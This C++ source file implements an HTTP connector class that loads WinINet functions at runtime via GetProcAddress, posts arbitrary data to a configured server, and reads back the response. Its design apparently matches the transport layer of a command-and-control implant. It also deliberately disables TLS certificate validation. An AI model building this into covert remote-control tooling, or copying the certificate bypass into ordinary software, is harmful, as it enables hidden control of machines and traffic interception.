#include "ConnectorHTTP.h"
#include "utils.h"

BOOL _isdigest(char c)
{
	return c >= '0' && c <= '9';
}

int _atoi(const char* str) 
{
	int result = 0;
	int sign = 1;
	int index = 0;

	while (str[index] == ' ')
		index++;
	
	if (str[index] == '-' || str[index] == '+') {
		sign = (str[index] == '-') ? -1 : 1;
		index++;
	}

	while ( _isdigest(str[index]) ) {
		int digit = str[index] - '0';
		if (result > (INT_MAX - digit) / 10) 
			return (sign == 1) ? INT_MAX : INT_MIN;
		
		result = result * 10 + digit;
		index++;
	}
	return result * sign;
}


ConnectorHTTP::ConnectorHTTP()
{
	decltype(LocalAlloc)* alloc = LocalAlloc;
	this->functions = (HTTPFUNC*) alloc(LPTR, sizeof(HTTPFUNC) );
	
	this->functions->LocalAlloc     = alloc;
	this->functions->LocalReAlloc   = LocalReAlloc;
	this->functions->LocalFree      = LocalFree;
	this->functions->GetProcAddress = GetProcAddress;
	this->functions->LoadLibraryA   = LoadLibraryA;

	HMODULE hWininetModule = this->functions->LoadLibraryA("wininet.dll");
	if (hWininetModule) {
		this->functions->InternetOpenA              = (decltype(InternetOpenA)*) this->functions->GetProcAddress(hWininetModule, "InternetOpenA");
		this->functions->InternetConnectA           = (decltype(InternetConnectA)*)this->functions->GetProcAddress(hWininetModule, "InternetConnectA");
		this->functions->HttpOpenRequestA           = (decltype(HttpOpenRequestA)*)this->functions->GetProcAddress(hWininetModule, "HttpOpenRequestA");
		this->functions->HttpSendRequestA           = (decltype(HttpSendRequestA)*)this->functions->GetProcAddress(hWininetModule, "HttpSendRequestA");
		this->functions->InternetSetOptionA         = (decltype(InternetSetOptionA)*)this->functions->GetProcAddress(hWininetModule, "InternetSetOptionA");
		this->functions->InternetQueryOptionA       = (decltype(InternetQueryOptionA)*)this->functions->GetProcAddress(hWininetModule, "InternetQueryOptionA");
		this->functions->HttpQueryInfoA             = (decltype(HttpQueryInfoA)*)this->functions->GetProcAddress(hWininetModule, "HttpQueryInfoA");
		this->functions->InternetQueryDataAvailable = (decltype(InternetQueryDataAvailable)*)this->functions->GetProcAddress(hWininetModule, "InternetQueryDataAvailable");
		this->functions->InternetCloseHandle        = (decltype(InternetCloseHandle)*)this->functions->GetProcAddress(hWininetModule, "InternetCloseHandle");
		this->functions->InternetReadFile           = (decltype(InternetReadFile)*)this->functions->GetProcAddress(hWininetModule, "InternetReadFile");
	}
}

void ConnectorHTTP::SetConfig( BOOL Ssl, CHAR* UserAgent, CHAR* Method, CHAR* Address, WORD Port, CHAR* Uri, CHAR* Headers)
{
	this->ssl            = Ssl;
	this->user_agent     = UserAgent;
	this->http_method    = Method;
	this->server_address = Address;
	this->server_port    = Port;
	this->uri			 = Uri;
	this->headers        = Headers;
}

HINTERNET hInternet = NULL;
HINTERNET hConnect  = NULL;


BYTE* ConnectorHTTP::SendData(BYTE* data, ULONG data_size, ULONG* recv_size)
{
	BOOL  result  = FALSE;
	DWORD context = 0;
	BYTE* recv    = NULL;
	*recv_size    = 0;

	if(!hInternet)
		hInternet = this->functions->InternetOpenA(this->user_agent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);

	if ( hInternet ) {

		if (!hConnect)
			hConnect = this->functions->InternetConnectA(hInternet, this->server_address, this->server_port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, (DWORD_PTR)&context);
		if ( hConnect ) 
		{
			LPCSTR rgpszAcceptTypes[] = { "*/*", 0 };
			DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_UI | INTERNET_FLAG_NO_COOKIES;
			if ( this->ssl )
				flags |= INTERNET_FLAG_SECURE;

			HINTERNET hRequest = this->functions->HttpOpenRequestA(hConnect, this->http_method, this->uri, 0, 0, rgpszAcceptTypes, flags, (DWORD_PTR)&context);
			if ( hRequest ) {
				if ( this->ssl ) {
					DWORD dwFlags;
					DWORD dwBuffer = sizeof(DWORD);
					result = this->functions->InternetQueryOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, &dwBuffer);
					if ( result ) {
						dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA | INTERNET_FLAG_IGNORE_CERT_CN_INVALID;
						this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
					}
				}
				BOOL result = this->functions->HttpSendRequestA( hRequest, this->headers, (DWORD) StrLenA(headers), (LPVOID)data, (DWORD)data_size );

				if ( result ) {
					char statusCode[255];
					DWORD statusCodeLenght = 255;
					result = this->functions->HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE, statusCode, &statusCodeLenght, 0);
					
					if ( result && _atoi(statusCode) == 200 ) {
						DWORD answerSize = 0;
						DWORD dwLengthDataSize = sizeof(DWORD);
						result = this->functions->HttpQueryInfoA(hRequest, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &answerSize, &dwLengthDataSize, NULL);
	
						if ( result ) {
							DWORD dwNumberOfBytesAvailable = 0;
							result = this->functions->InternetQueryDataAvailable(hRequest, &dwNumberOfBytesAvailable, 0, 0);
							
							if ( result && answerSize > 0 ) {
								ULONG numberReadedBytes = 0;
								DWORD readedBytes = 0;
								BYTE* buffer = (BYTE*)this->functions->LocalAlloc( LPTR, answerSize );

								while (numberReadedBytes < answerSize) {	
									result = this->functions->InternetReadFile(hRequest, buffer + numberReadedBytes, dwNumberOfBytesAvailable, &readedBytes);
									if (!result || !readedBytes) {
										break;
									}
									numberReadedBytes += readedBytes;
								}					
								*recv_size = numberReadedBytes;
								recv = buffer;
							}
						}
						else if ( GetLastError() == ERROR_HTTP_HEADER_NOT_FOUND ) {
							ULONG numberReadedBytes = 0;
							DWORD readedBytes = 0;
							BYTE* buffer = (BYTE*) this->functions->LocalAlloc(LPTR, 0);
							DWORD dwNumberOfBytesAvailable = 0;

							while (1) {
								result = this->functions->InternetQueryDataAvailable(hRequest, &dwNumberOfBytesAvailable, 0, 0);
								if ( !result || !dwNumberOfBytesAvailable )
									break;

								buffer = (BYTE*)this->functions->LocalReAlloc(buffer, dwNumberOfBytesAvailable + numberReadedBytes, LMEM_MOVEABLE);
								result = this->functions->InternetReadFile(hRequest, buffer + numberReadedBytes, dwNumberOfBytesAvailable, &readedBytes);
								if ( !result || !readedBytes) {
									break;
								}
								numberReadedBytes += readedBytes;
							}

							if (numberReadedBytes) {
								*recv_size = numberReadedBytes;
								recv = buffer;
							}
							else {
								this->functions->LocalFree(buffer);
							}
						}
					}
				}
				this->functions->InternetCloseHandle(hRequest);
			}
		}
	}
	return recv;
}